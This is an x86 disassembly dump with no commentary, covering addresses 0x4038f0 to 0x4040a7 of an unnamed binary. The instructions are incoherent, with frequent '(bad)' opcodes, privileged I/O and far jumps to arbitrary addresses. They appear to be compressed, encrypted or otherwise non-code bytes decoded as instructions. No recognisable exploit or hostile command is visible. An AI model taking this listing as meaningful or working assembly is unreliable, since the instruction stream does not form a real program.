  4038f0:	mov    cl,0x31
  4038f2:	rol    BYTE PTR [ebx-0x5b],1
  4038f5:	mov    eax,ds:0xc7a6ec6
  4038fa:	hlt    
  4038fb:	scas   eax,DWORD PTR es:[edi]
  4038fc:	jns    0x40394d
  4038fe:	xor    BYTE PTR [ebp+0x6],ch
  403901:	cmp    BYTE PTR [eax-0x2e],0x19
  403905:	rcr    edi,cl
  403907:	fist   WORD PTR [edx+edx*2]
  40390a:	test   DWORD PTR [edx],0x4e7875ba
  403910:	mov    ecx,ecx
  403912:	dec    ebx
  403913:	les    edi,FWORD PTR es:[ecx-0x78b2e3a3]
  40391a:	and    BYTE PTR [eax],dl
  40391c:	in     al,dx
  40391d:	cmc    
  40391e:	stc    
  40391f:	retf   
  403920:	test   eax,0x2be6a2f
  403925:	mov    ah,0xee
  403927:	add    dl,BYTE PTR [ecx-0xd]
  40392a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40392b:	and    eax,0x8b98a3d9
  403930:	clc    
  403931:	daa    
  403932:	cs jmp 0x51812246
  403938:	mov    bh,BYTE PTR ds:0x93d8a5b
  40393e:	mov    al,0x96
  403940:	iret   
  403941:	cmc    
  403942:	(bad)  
  403943:	adc    eax,0x5fb0266f
  403948:	mov    ecx,ebp
  40394a:	inc    edi
  40394b:	add    ch,bl
  40394d:	inc    edi
  40394e:	bound  ecx,QWORD PTR [esi+0x6c]
  403951:	add    DWORD PTR [edx+0x6a],esp
  403954:	test   eax,0x80f0e71a
  403959:	mov    es,WORD PTR [ebx+0xc]
  40395c:	jp     0x4038e0
  40395e:	ret    0x5dd5
  403961:	repz fcomp DWORD PTR [ecx+0x14]
  403965:	mov    fs,WORD PTR ds:0xc3160427
  40396b:	xchg   BYTE PTR [ebx],dl
  40396d:	xchg   ebx,eax
  40396e:	lahf   
  40396f:	pop    esi
  403970:	mov    edi,esp
  403972:	repz add eax,0x59038bf1
  403978:	pop    ecx
  403979:	sbb    ebx,DWORD PTR [edi+0x5]
  40397c:	nop
  40397d:	pop    ecx
  40397e:	fldcw  WORD PTR [edx-0x73a52e46]
  403984:	arpl   WORD PTR [edx],si
  403986:	mov    ebx,0xea311ef5
  40398b:	je     0x403991
  40398d:	mov    edx,0x82ada130
  403992:	iret   
  403993:	inc    DWORD PTR ds:0x2bd977f3
  403999:	outs   dx,DWORD PTR ds:[esi]
  40399a:	mov    dh,0x5b
  40399c:	mov    edi,0x49cd0f1d
  4039a1:	imul   ecx,DWORD PTR [ebx+0x416dc96d],0xbaf68c71
  4039ab:	and    al,0x8f
  4039ad:	cwde   
  4039ae:	rcr    esi,0x55
  4039b1:	push   ebx
  4039b2:	sbb    eax,0x22052e78
  4039b7:	(bad)  
  4039b8:	push   DWORD PTR [esi-0x3aee2d24]
  4039be:	js     0x40398e
  4039c0:	inc    ecx
  4039c1:	(bad)  
  4039c2:	dec    edx
  4039c3:	ins    BYTE PTR es:[edi],dx
  4039c4:	stos   BYTE PTR es:[edi],al
  4039c5:	int    0x65
  4039c7:	cmp    al,0xb9
  4039c9:	pusha  
  4039ca:	aad    0x1d
  4039cc:	je     0x403993
  4039ce:	(bad)  
  4039cf:	imul   DWORD PTR [ebx-0x54]
  4039d2:	aas    
  4039d3:	ins    BYTE PTR es:[edi],dx
  4039d4:	push   esp
  4039d5:	xor    eax,0x433f0a45
  4039da:	cmc    
  4039db:	fisttp DWORD PTR [ebx-0x42852321]
  4039e2:	js     0x403a53
  4039e4:	int    0x84
  4039e6:	push   ds
  4039e7:	call   0xc74f3d08
  4039ec:	pop    es
  4039ed:	sub    al,0x1e
  4039ef:	jbe    0x4039ba
  4039f1:	ja     0x4039ea
  4039f3:	(bad)  [ebp+ecx*4-0x115eccc9]
  4039fa:	sub    al,0x19
  4039fc:	(bad)  
  4039fd:	pop    edi
  4039fe:	push   es
  4039ff:	adc    DWORD PTR [ecx],esi
  403a01:	sbb    al,0x6f
  403a03:	sub    DWORD PTR [edx-0x7209d514],esi
  403a09:	dec    edx
  403a0a:	(bad)  [edx-0x64]
  403a0d:	aad    0x1c
  403a0f:	loopne 0x403a15
  403a11:	mov    edi,0xd2dd4507
  403a16:	popf   
  403a17:	or     eax,0xaed00970
  403a1c:	xor    DWORD PTR [eax],edx
  403a1e:	ror    BYTE PTR [esp+edi*4],cl
  403a21:	jne    0x403a1a
  403a23:	add    BYTE PTR [ebx-0x1a],0x64
  403a27:	adc    DWORD PTR [ecx],ebp
  403a29:	shl    bh,1
  403a2b:	arpl   WORD PTR [ebp+0xb],bx
  403a2e:	addr16 jl 0x403a3b
  403a31:	cmp    bh,BYTE PTR [edx+0xc]
  403a34:	sub    BYTE PTR [edx],0xf6
  403a37:	icebp  
  403a38:	retf   0xe449
  403a3b:	cmp    ebp,ebp
  403a3d:	dec    ecx
  403a3e:	xor    eax,0x4013443e
  403a43:	enter  0xb8d1,0xff
  403a47:	or     ebx,DWORD PTR [eax+0x57]
  403a4a:	pushf  
  403a4b:	(bad)  
  403a4d:	(bad)  [ebx-0x19]
  403a50:	in     al,0x7d
  403a52:	stc    
  403a53:	fimul  DWORD PTR [esi-0x3a]
  403a56:	push   eax
  403a57:	addr16 xchg esp,eax
  403a59:	jle    0x403a45
  403a5b:	addr16 add ecx,edx
  403a5e:	xchg   ebx,eax
  403a5f:	call   0x4804c04e
  403a64:	aaa    
  403a65:	fadd   DWORD PTR ds:0x70f63d69
  403a6b:	mov    ebx,DWORD PTR [eax+0x42e0487f]
  403a71:	hlt    
  403a72:	adc    DWORD PTR [edx],0x8c4557f4
  403a78:	push   cs
  403a79:	ret    0x22ed
  403a7c:	push   ebp
  403a7d:	add    edx,ebx
  403a7f:	push   ds
  403a80:	stos   BYTE PTR es:[edi],al
  403a81:	mov    BYTE PTR [edi],ah
  403a83:	es repz js 0x403a95
  403a87:	cs sbb eax,0xc748c3f0
  403a8d:	cmp    dl,BYTE PTR [ecx+ebp*1+0x4]
  403a91:	jno    0x403ac1
  403a93:	rcr    BYTE PTR [ebx],1
  403a95:	gs js  0x403ab9
  403a98:	fcomp  QWORD PTR [esi+ecx*2-0x75]
  403a9c:	push   es
  403a9d:	and    ah,cl
  403a9f:	mov    ecx,0xd12f9b9f
  403aa4:	stos   DWORD PTR es:[edi],eax
  403aa5:	imul   ah
  403aa7:	loop   0x403b24
  403aa9:	imul   ebp,esi,0xffffffc9
  403aac:	(bad)  
  403aad:	ror    ch,1
  403aaf:	nop
  403ab0:	xchg   edi,eax
  403ab1:	mov    ecx,0xe8866eae
  403ab6:	gs inc esp
  403ab8:	mov    bh,0xbb
  403aba:	(bad)  
  403abb:	push   0x20
  403abd:	mov    WORD PTR [edx],?
  403abf:	and    ecx,DWORD PTR [edi-0x4bfa0d55]
  403ac5:	bound  ebx,QWORD PTR [edi+0x79]
  403ac8:	sub    ebp,DWORD PTR [ebp-0x299d4ee4]
  403ace:	and    eax,0x9d39c1db
  403ad3:	jae    0x403b54
  403ad5:	aam    0xc2
  403ad7:	imul   edx,DWORD PTR [eax],0x48
  403ada:	js     0x403b5a
  403adc:	push   ecx
  403add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ade:	mov    ds:0x24fde5ca,eax
  403ae3:	cmp    eax,0xfed02ae5
  403ae8:	arpl   WORD PTR [ebx+0x1b],ax
  403aeb:	and    eax,0x764524ed
  403af0:	cmp    al,0x6e
  403af2:	pop    ebx
  403af3:	sbb    ecx,ecx
  403af5:	outs   dx,DWORD PTR ds:[esi]
  403af6:	clc    
  403af7:	shl    esp,1
  403af9:	mov    ecx,0x761b67d2
  403afe:	cmp    eax,0xd8fb59cf
  403b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b04:	mov    edi,0xcafad59c
  403b09:	xor    bl,dl
  403b0b:	test   al,cl
  403b0d:	(bad)  
  403b0e:	outs   dx,DWORD PTR ds:[esi]
  403b0f:	jmp    0xccab:0x38d80a99
  403b16:	ficomp DWORD PTR [ebp-0x3b]
  403b19:	push   cs
  403b1a:	mov    edx,0xf90e76a9
  403b1f:	or     dl,bh
  403b21:	mov    eax,0xdd5696c1
  403b26:	inc    esi
  403b27:	or     DWORD PTR [ebp-0x76],eax
  403b2a:	push   ebx
  403b2b:	push   esi
  403b2c:	cmp    esp,ebx
  403b2e:	outs   dx,BYTE PTR ds:[esi]
  403b2f:	xchg   esi,eax
  403b30:	mov    ebp,0x403550f5
  403b35:	jmp    0x403b61
  403b37:	mov    bl,0x4f
  403b39:	mov    ch,0x15
  403b3b:	push   0x4564f4fc
  403b40:	add    DWORD PTR fs:[esi],0xfffffffc
  403b44:	xor    DWORD PTR [edi+0x28],ecx
  403b47:	add    dh,BYTE PTR [edi-0x6d18a998]
  403b4d:	hlt    
  403b4e:	addr16 mov bl,0x39
  403b51:	xor    edi,DWORD PTR [edi+0x51]
  403b54:	hlt    
  403b55:	lock jo 0x403b9d
  403b58:	cmp    ch,dh
  403b5a:	(bad)  
  403b5c:	in     al,dx
  403b5d:	not    BYTE PTR [ebx]
  403b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b60:	mov    dh,0x2c
  403b62:	push   es
  403b63:	mov    cl,BYTE PTR ds:0x27189d2b
  403b69:	outs   dx,DWORD PTR ds:[esi]
  403b6a:	mov    esi,0x7372bf2d
  403b6f:	mov    ecx,0x7570b0ee
  403b74:	xor    eax,DWORD PTR [edi-0x4357b17c]
  403b7a:	in     al,dx
  403b7b:	pop    es
  403b7c:	dec    esi
  403b7d:	cwde   
  403b7e:	ret    
  403b7f:	xor    dl,0x77
  403b82:	dec    esi
  403b83:	xchg   BYTE PTR [esi],cl
  403b85:	push   esp
  403b86:	scas   al,BYTE PTR es:[edi]
  403b87:	cld    
  403b88:	cmc    
  403b89:	pop    es
  403b8a:	xor    bl,ah
  403b8c:	mov    edx,0xb67eae1a
  403b91:	push   esp
  403b92:	sti    
  403b93:	je     0x403b3f
  403b95:	jnp    0x403bb0
  403b97:	stos   DWORD PTR es:[edi],eax
  403b98:	cmp    DWORD PTR ds:0x28da397c,ebx
  403b9e:	xchg   ecx,eax
  403b9f:	icebp  
  403ba0:	int    0x6
  403ba2:	stos   BYTE PTR es:[edi],al
  403ba3:	clc    
  403ba4:	mov    ds,WORD PTR [edx+0x17]
  403ba7:	ja     0x403bd9
  403ba9:	neg    DWORD PTR [ebx]
  403bab:	clc    
  403bac:	pop    esp
  403bad:	jmp    0xe1f1:0x375ed260
  403bb4:	push   cs
  403bb5:	xor    al,0xac
  403bb7:	xchg   dh,bh
  403bb9:	xchg   ebx,eax
  403bba:	and    DWORD PTR [eax],0xd27e08e
  403bc0:	push   esi
  403bc1:	sbb    ah,dh
  403bc3:	(bad)  
  403bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc5:	add    al,0x48
  403bc7:	adc    BYTE PTR [esi],bh
  403bc9:	inc    esi
  403bca:	cmp    BYTE PTR [esi-0x599c4eae],dl
  403bd0:	add    BYTE PTR [ecx-0x79],cl
  403bd3:	adc    BYTE PTR [esi+0x7e676c58],0xbe
  403bda:	jecxz  0x403c17
  403bdc:	scas   eax,DWORD PTR es:[edi]
  403bdd:	pusha  
  403bde:	ins    BYTE PTR es:[edi],dx
  403bdf:	push   ss
  403be0:	aam    0x75
  403be2:	sub    BYTE PTR [edx-0x69],bl
  403be5:	and    al,BYTE PTR [ebx+ecx*1-0x6c]
  403be9:	inc    ebp
  403bea:	jmp    0x410a:0xf1fc6063
  403bf1:	repnz xor al,0x23
  403bf4:	test   DWORD PTR [edi+eiz*1+0x4b],ebx
  403bf8:	inc    eax
  403bf9:	mov    edx,0xe74587db
  403bfe:	jp     0x403c0e
  403c00:	sub    DWORD PTR [edx+esi*4-0x36],esi
  403c04:	sub    BYTE PTR [ebp+0x2b],bh
  403c07:	mov    esi,ebx
  403c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c0a:	mov    ebp,0x3c3b62e9
  403c0f:	dec    ebx
  403c10:	ins    DWORD PTR es:[edi],dx
  403c11:	jmp    0x2f4bd698
  403c16:	sets   BYTE PTR [edx]
  403c19:	lock out dx,al
  403c1b:	aas    
  403c1c:	push   0xd616a3b7
  403c21:	add    eax,0x5b6e098d
  403c26:	popa   
  403c27:	fld    DWORD PTR [ebx]
  403c29:	ins    DWORD PTR es:[edi],dx
  403c2a:	mov    ebp,0x5b986d3
  403c2f:	mov    esi,DWORD PTR [edi+0x1c]
  403c32:	fcom   QWORD PTR [ebx-0x756c3ca5]
  403c38:	out    dx,al
  403c39:	push   eax
  403c3a:	fsub   st,st(1)
  403c3c:	xchg   edi,eax
  403c3d:	daa    
  403c3e:	jmp    0x83580207
  403c43:	out    0x59,eax
  403c45:	jmp    0xf762:0x84e5ce0a
  403c4c:	and    DWORD PTR [eax],ebx
  403c4e:	mov    ebx,0x856af1ba
  403c53:	add    DWORD PTR [edi+ebp*4+0x66],0x35
  403c58:	das    
  403c59:	mov    bl,0x6e
  403c5b:	jmp    0x403c2f
  403c5d:	push   ds
  403c5e:	pop    eax
  403c5f:	inc    ecx
  403c60:	pop    esi
  403c61:	xchg   ebp,eax
  403c62:	push   ecx
  403c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c64:	enter  0xdac,0x22
  403c68:	ins    DWORD PTR es:[edi],dx
  403c69:	rcl    DWORD PTR [edi+0x3e1d10c9],cl
  403c6f:	lods   al,BYTE PTR ds:[esi]
  403c70:	jge    0x403c0a
  403c72:	cmp    al,0xd4
  403c74:	test   DWORD PTR [edx-0x5d],ebp
  403c77:	ins    DWORD PTR es:[edi],dx
  403c78:	xchg   ebx,eax
  403c79:	fidiv  WORD PTR [ecx+ebx*4-0x50b27fe8]
  403c80:	daa    
  403c81:	pop    ss
  403c82:	pop    ecx
  403c83:	sub    eax,0x792b0d98
  403c88:	mov    ds:0x99906ea2,eax
  403c8d:	stos   DWORD PTR es:[edi],eax
  403c8e:	(bad)  
  403c90:	push   edi
  403c92:	int3   
  403c93:	xchg   ebp,ecx
  403c95:	aad    0xc0
  403c97:	pop    ebp
  403c98:	push   ecx
  403c99:	pop    es
  403c9a:	mov    esi,0x3696b59c
  403c9f:	fisub  DWORD PTR [ecx-0x64723fc0]
  403ca5:	and    cl,ah
  403ca7:	(bad)  
  403ca8:	mov    al,ds:0x24c506c2
  403cad:	dec    ecx
  403cae:	jnp    0x403c3d
  403cb0:	sub    eax,0x4bbf4fdb
  403cb5:	xchg   ebx,eax
  403cb6:	cli    
  403cb7:	mov    al,ds:0x795004e7
  403cbc:	lods   eax,DWORD PTR ds:[esi]
  403cbd:	sub    eax,0xde1815a8
  403cc2:	inc    ecx
  403cc3:	inc    ebx
  403cc4:	inc    esp
  403cc5:	fldenv [ecx-0x35c373b6]
  403ccb:	and    edi,DWORD PTR [esi-0x23fb4c1e]
  403cd1:	sub    al,0x44
  403cd3:	in     al,dx
  403cd4:	xchg   DWORD PTR [ebx-0x24],esi
  403cd7:	jae    0x403d2d
  403cd9:	add    BYTE PTR [ecx-0x6c215b9f],0xae
  403ce0:	adc    al,0x2b
  403ce2:	out    dx,eax
  403ce3:	or     ch,BYTE PTR [eax]
  403ce5:	fist   DWORD PTR [eax-0x483e795b]
  403ceb:	fstp   QWORD PTR ds:0xcfb80eb0
  403cf1:	add    al,0x41
  403cf3:	inc    ebp
  403cf4:	(bad)  [esi+0x32]
  403cf7:	std    
  403cf8:	dec    eax
  403cf9:	aad    0xf1
  403cfb:	inc    ebx
  403cfc:	mov    edx,0xa8f04ae1
  403d01:	je     0x403ccc
  403d03:	or     cl,BYTE PTR [ebx-0x53cbbc64]
  403d09:	mov    ch,0x4b
  403d0b:	popf   
  403d0c:	sub    BYTE PTR [edx+0x4c086ec0],bh
  403d12:	fadd   QWORD PTR [esi]
  403d14:	mov    ecx,0xa2e366c3
  403d19:	push   edx
  403d1a:	xchg   ebx,eax
  403d1b:	popa   
  403d1c:	sar    BYTE PTR cs:[esi+0x555377c6],0x82
  403d24:	cmp    esp,DWORD PTR [ecx+0x41f31faa]
  403d2a:	aad    0xbb
  403d2c:	sbb    eax,0x3508f0f7
  403d31:	sub    DWORD PTR [ebx+0x274cb353],esi
  403d37:	xchg   ecx,eax
  403d38:	sar    DWORD PTR [edx],1
  403d3a:	or     BYTE PTR [edx+0x2e],bl
  403d3d:	jo     0x403d3d
  403d3f:	stos   DWORD PTR es:[edi],eax
  403d40:	jb     0x403dbd
  403d42:	xchg   edx,eax
  403d43:	or     eax,0x7b607ac2
  403d48:	in     eax,dx
  403d49:	inc    ebp
  403d4a:	lahf   
  403d4b:	add    al,0xc0
  403d4d:	lock and DWORD PTR gs:[ebx-0x9b97bfe],edi
  403d55:	test   DWORD PTR [ebp-0x45],0x1af23b05
  403d5c:	jb     0x403d33
  403d5e:	jae    0x403d3b
  403d60:	cmp    dh,BYTE PTR [ebx+0x37af7622]
  403d66:	pop    esi
  403d67:	call   0x9488:0xf9988ac1
  403d6e:	(bad)  
  403d6f:	cli    
  403d70:	inc    esi
  403d71:	jl     0x403de8
  403d73:	sub    DWORD PTR [ecx-0x37],esp
  403d76:	pushf  
  403d77:	pop    ecx
  403d78:	aad    0x9f
  403d7a:	int    0x67
  403d7c:	or     al,0x60
  403d7e:	cmp    DWORD PTR [esi-0x29],ebp
  403d81:	inc    ebp
  403d82:	adc    eax,ebp
  403d84:	cmp    BYTE PTR [esi],ah
  403d86:	add    al,0x90
  403d88:	sbb    BYTE PTR [edi+0x5c0432a],cl
  403d8e:	pop    ss
  403d8f:	cmp    eax,0xd59c1e41
  403d94:	int    0x6d
  403d96:	or     BYTE PTR [esp+esi*4-0x17],dl
  403d9a:	int    0xef
  403d9c:	mov    cl,0xc
  403d9e:	jle    0x403dec
  403da0:	inc    eax
  403da1:	pop    ds
  403da2:	push   ds
  403da3:	cmp    eax,0x26763b75
  403da8:	xor    ch,BYTE PTR [edx]
  403daa:	sti    
  403dab:	pop    ebx
  403dac:	in     eax,dx
  403dad:	and    dl,dh
  403daf:	xor    ebp,eax
  403db1:	in     eax,0xa5
  403db3:	rcr    BYTE PTR [ecx],0xaf
  403db6:	jo     0x403d81
  403db8:	jne    0x403e28
  403dba:	mov    dh,0xf8
  403dbc:	lods   eax,DWORD PTR ds:[esi]
  403dbd:	cmc    
  403dbe:	fst    DWORD PTR [edx]
  403dc0:	mov    ds:0x26219310,al
  403dc5:	mov    esp,0x462bd11f
  403dca:	pop    edx
  403dcb:	pop    ecx
  403dcc:	out    0x52,al
  403dce:	mov    DWORD PTR [ebp-0x1de8f660],ecx
  403dd4:	sbb    dh,bl
  403dd6:	mov    al,ds:0xc61c735b
  403ddb:	outs   dx,BYTE PTR ds:[esi]
  403ddc:	xchg   ecx,eax
  403ddd:	add    dh,bl
  403ddf:	push   ss
  403de0:	call   0x6d4bdcfb
  403de5:	push   ebx
  403de6:	cwde   
  403de7:	or     esi,DWORD PTR [ecx-0x53597f3]
  403ded:	fwait
  403dee:	sysret 
  403df0:	jnp    0x403e34
  403df2:	xchg   DWORD PTR [esi+ecx*8-0x7d],ecx
  403df6:	cwde   
  403df7:	mov    ch,0xf
  403df9:	push   0x70ad570a
  403dfe:	fistp  QWORD PTR ds:0x2b644421
  403e04:	sbb    BYTE PTR ds:0xa7513657,bl
  403e0a:	(bad)  
  403e0c:	xor    BYTE PTR [edi],0x56
  403e0f:	fild   QWORD PTR [edi-0x19743470]
  403e15:	jns    0x403d99
  403e17:	and    al,0xc3
  403e19:	popf   
  403e1a:	hlt    
  403e1b:	imul   esp,DWORD PTR [edi],0xffffffcf
  403e1e:	nop
  403e1f:	popa   
  403e20:	sbb    BYTE PTR [eax+0x18],ah
  403e23:	outs   dx,DWORD PTR ds:[esi]
  403e24:	jle    0x403e25
  403e26:	push   eax
  403e27:	xchg   edi,eax
  403e28:	dec    edi
  403e29:	xchg   esp,eax
  403e2a:	cli    
  403e2b:	adc    ah,BYTE PTR [edx+0x70]
  403e2e:	adc    al,0xe6
  403e30:	call   0x806e0db1
  403e35:	inc    edx
  403e36:	fldenv [esi+0x121f411]
  403e3c:	je     0x403e02
  403e3e:	xor    dh,BYTE PTR [eax]
  403e40:	bnd jl 0x403e42
  403e43:	mov    ds:0xfec2bbb2,eax
  403e48:	add    ecx,0xffffffda
  403e4b:	mov    edx,0xafe6be9a
  403e50:	mov    eax,ds:0x38ea4b8c
  403e55:	push   esi
  403e56:	adc    al,0xc0
  403e58:	shr    bl,1
  403e5a:	fdiv   QWORD PTR [ebx+eiz*2+0x1d]
  403e5e:	sub    eax,0x257fc3e5
  403e63:	aaa    
  403e64:	sub    DWORD PTR [edx],ecx
  403e66:	mov    esp,0x1c460dfe
  403e6b:	jg     0x403ec9
  403e6d:	(bad)  
  403e6e:	retf   0x603b
  403e71:	in     al,dx
  403e72:	sbb    al,0xa0
  403e74:	scas   eax,DWORD PTR es:[edi]
  403e75:	sbb    cl,BYTE PTR [ebp+0x42]
  403e78:	dec    ebx
  403e79:	mov    ds:0x6255595e,eax
  403e7e:	lds    esp,FWORD PTR [ebx]
  403e80:	inc    esi
  403e81:	and    bh,BYTE PTR [ecx-0x6d8357d3]
  403e87:	adc    BYTE PTR [ecx],cl
  403e89:	mov    al,ds:0x14075403
  403e8e:	cmp    edi,DWORD PTR [edx]
  403e90:	cli    
  403e91:	shl    DWORD PTR [ebx],cl
  403e93:	push   DWORD PTR [esi+0x19]
  403e96:	push   es
  403e97:	rcr    DWORD PTR [edx-0x3bf0837c],cl
  403e9d:	scas   eax,DWORD PTR es:[edi]
  403e9e:	cmp    eax,0x37bf6ad6
  403ea3:	add    al,0xc2
  403ea5:	push   0xffffff8a
  403ea7:	mov    esi,0xd59e202c
  403eac:	aaa    
  403ead:	xor    ah,BYTE PTR [edi+esi*2+0x6]
  403eb1:	les    ecx,FWORD PTR [edi+0x42]
  403eb4:	sbb    eax,esp
  403eb6:	shl    DWORD PTR [eax],1
  403eb8:	pop    edx
  403eb9:	mov    eax,ds:0xa818ec54
  403ebe:	aas    
  403ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ec0:	aas    
  403ec1:	in     al,0x4f
  403ec3:	mov    eax,ds:0x53587844
  403ec8:	sbb    DWORD PTR [ebx-0x1d],ecx
  403ecb:	(bad)  
  403ecc:	clc    
  403ecd:	(bad)  
  403ece:	in     al,0x8c
  403ed0:	xor    dl,BYTE PTR [ebx+0x8]
  403ed3:	xor    DWORD PTR [edi+0x35681713],ebx
  403ed9:	or     ecx,DWORD PTR [edx]
  403edb:	lea    esi,[ebx-0x3a]
  403ede:	inc    edi
  403edf:	out    0x33,al
  403ee1:	push   0x739e4a4d
  403ee6:	sbb    dl,cl
  403ee8:	mov    cl,0xac
  403eea:	out    0xf6,al
  403eec:	cli    
  403eed:	xor    al,0xdb
  403eef:	and    eax,0x557d319a
  403ef4:	jns    0x403f07
  403ef6:	mov    BYTE PTR [esi],0x6b
  403ef9:	mov    ah,0x89
  403efb:	pop    ebp
  403efc:	inc    edi
  403efd:	neg    DWORD PTR [eax]
  403eff:	ja     0x403f5f
  403f01:	mov    ah,BYTE PTR [ebx-0x545057b2]
  403f07:	stos   DWORD PTR es:[edi],eax
  403f08:	push   edx
  403f09:	pop    esp
  403f0a:	outs   dx,BYTE PTR ds:[esi]
  403f0b:	mov    ds:0x366a2177,eax
  403f10:	pushf  
  403f11:	mov    ah,0xb5
  403f13:	cmp    ah,bh
  403f15:	imul   ecx,esi,0x2b6d2307
  403f1b:	in     al,dx
  403f1c:	add    BYTE PTR ss:[edi+0x3c022103],0x6f
  403f24:	push   ecx
  403f25:	cdq    
  403f26:	test   al,0x5f
  403f28:	add    esp,esp
  403f2a:	clc    
  403f2b:	and    DWORD PTR [ebp-0x50],eax
  403f2e:	inc    BYTE PTR [esi]
  403f30:	scas   eax,DWORD PTR es:[edi]
  403f31:	inc    ebp
  403f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f33:	imul   edi,DWORD PTR [ebp+0x4bfada65],0x36
  403f3a:	dec    ebx
  403f3b:	lods   eax,DWORD PTR ds:[esi]
  403f3c:	pop    esp
  403f3d:	add    al,0x5a
  403f3f:	clc    
  403f40:	enter  0x6deb,0xf3
  403f44:	pop    ebp
  403f45:	xchg   ebp,eax
  403f46:	fwait
  403f47:	icebp  
  403f48:	inc    edi
  403f49:	je     0x403f46
  403f4b:	or     al,0x19
  403f4d:	retf   0x944a
  403f50:	sahf   
  403f51:	je     0x403fb8
  403f53:	cmc    
  403f54:	sahf   
  403f55:	lds    edi,FWORD PTR [ebx+0x3911b158]
  403f5b:	and    eax,0x92e2b335
  403f60:	es pop ds
  403f62:	jp     0x403f76
  403f64:	test   al,0x41
  403f66:	push   eax
  403f67:	pop    ecx
  403f68:	sahf   
  403f69:	mov    eax,ds:0x906fce2d
  403f6e:	outs   dx,DWORD PTR ds:[esi]
  403f6f:	cmp    eax,ebx
  403f71:	adc    eax,DWORD PTR [edx-0x774a66fb]
  403f77:	out    0x34,al
  403f79:	popa   
  403f7a:	dec    edx
  403f7b:	sub    al,0x49
  403f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7e:	aaa    
  403f7f:	push   esi
  403f80:	mov    ds:0x85beac1b,eax
  403f85:	inc    edi
  403f86:	faddp  st(4),st
  403f88:	dec    esp
  403f89:	scas   al,BYTE PTR es:[edi]
  403f8a:	xchg   ebx,eax
  403f8b:	enter  0xe714,0x64
  403f8f:	jp     0x403f7b
  403f91:	fdivr  QWORD PTR [ebp-0x37]
  403f94:	sbb    ebx,DWORD PTR [esi-0x49]
  403f97:	punpckldq mm0,DWORD PTR [eax+eiz*1-0x1a]
  403f9c:	scas   eax,DWORD PTR es:[edi]
  403f9d:	mov    WORD PTR [ebx-0x2ffe2655],ss
  403fa3:	mov    dh,0x3c
  403fa5:	daa    
  403fa6:	mov    edx,0xd0f62cab
  403fab:	mov    ebp,0xbf98a1cd
  403fb0:	cmp    ah,BYTE PTR ds:0xb7a088ec
  403fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb7:	push   es
  403fb8:	pop    es
  403fb9:	sub    eax,0x7191076c
  403fbe:	pop    edi
  403fbf:	pop    ebp
  403fc0:	inc    edi
  403fc1:	lea    ecx,[ebx]
  403fc3:	sub    DWORD PTR [esi+0x38],ecx
  403fc6:	push   edx
  403fc7:	jo     0x403f68
  403fc9:	adc    eax,ebp
  403fcb:	sbb    DWORD PTR [ebp-0xaaa4827],ecx
  403fd1:	sbb    eax,0x265fd66d
  403fd6:	or     DWORD PTR [eax-0x1d],ebx
  403fd9:	nop
  403fda:	and    eax,0x3cef70a0
  403fdf:	dec    esi
  403fe0:	mov    di,0xe614
  403fe4:	or     ecx,DWORD PTR [ebx]
  403fe6:	jl     0x403fbd
  403fe8:	or     eax,0x2226e650
  403fed:	jmp    0x403f94
  403fef:	pop    ds
  403ff0:	xor    bl,BYTE PTR [edx+edx*8+0x34]
  403ff4:	bound  ebp,QWORD PTR ds:0x2a54991e
  403ffa:	cmp    al,0xa5
  403ffc:	sub    eax,0x49fd94d
  404001:	iret   
  404002:	loopne 0x403fdb
  404004:	sub    ah,BYTE PTR [ebx-0x1a]
  404007:	adc    BYTE PTR ds:0x7043e52e,cl
  40400d:	sub    DWORD PTR [ecx-0x6],eax
  404010:	jecxz  0x40404d
  404012:	pop    ss
  404013:	pop    es
  404014:	mov    ebp,0xf09e4349
  404019:	pop    esp
  40401a:	push   ss
  40401b:	imul   ebp,DWORD PTR [ebx],0xffffffb1
  40401e:	jp     0x404013
  404020:	sbb    al,0x25
  404022:	enter  0xa738,0x85
  404026:	inc    BYTE PTR [edi+0x22]
  404029:	xor    al,0x3c
  40402b:	push   ebx
  40402c:	sbb    ecx,DWORD PTR [edi]
  40402e:	(bad)  
  40402f:	cmp    bh,BYTE PTR [ebx-0x36]
  404032:	fcomp  DWORD PTR [ecx+0x28]
  404035:	ins    BYTE PTR es:[edi],dx
  404036:	ins    DWORD PTR es:[edi],dx
  404037:	daa    
  404038:	jecxz  0x404053
  40403a:	mov    ah,BYTE PTR [edi-0x14]
  40403d:	push   ss
  40403e:	mov    ah,0xc7
  404040:	test   eax,0xfa58cdd
  404045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404046:	add    eax,0xe5a7f691
  40404b:	int    0x55
  40404d:	jae    0x40408d
  40404f:	fsubr  st(6),st
  404051:	xchg   edi,eax
  404052:	inc    eax
  404053:	xchg   ebx,eax
  404054:	jne    0x404081
  404056:	(bad)  
  404057:	dec    edx
  404058:	jmp    0x1e080173
  40405d:	jo     0x40404c
  40405f:	cld    
  404060:	retf   0xbcf8
  404063:	pop    ds
  404064:	imul   DWORD PTR [ebp+0x7]
  404067:	mov    ds:0xaeaf6b87,al
  40406c:	in     eax,0x5
  40406e:	xchg   esp,eax
  40406f:	sbb    BYTE PTR [ebp-0x54],dh
  404072:	mov    ?,WORD PTR [ebp-0x2b9f6c33]
  404078:	aas    
  404079:	inc    ebp
  40407a:	xor    al,0x20
  40407c:	cmp    eax,0x1dc28c8
  404081:	dec    ebp
  404082:	sbb    cl,bl
  404084:	mov    al,ds:0x6d0bd3a9
  404089:	nop
  40408a:	mov    al,ds:0x1e1b0fed
  40408f:	xor    al,0xb6
  404091:	cmp    eax,0xe53f4e2f
  404096:	xchg   esi,eax
  404097:	scas   eax,DWORD PTR es:[edi]
  404098:	adc    bl,BYTE PTR [edi-0x8d2b5a9]
  40409e:	fwait
  40409f:	in     al,dx
  4040a0:	cmp    bh,al
  4040a2:	xor    BYTE PTR [edi+ebx*4+0x53],dl
  4040a6:	push   ss
  4040a7:	(bad)  
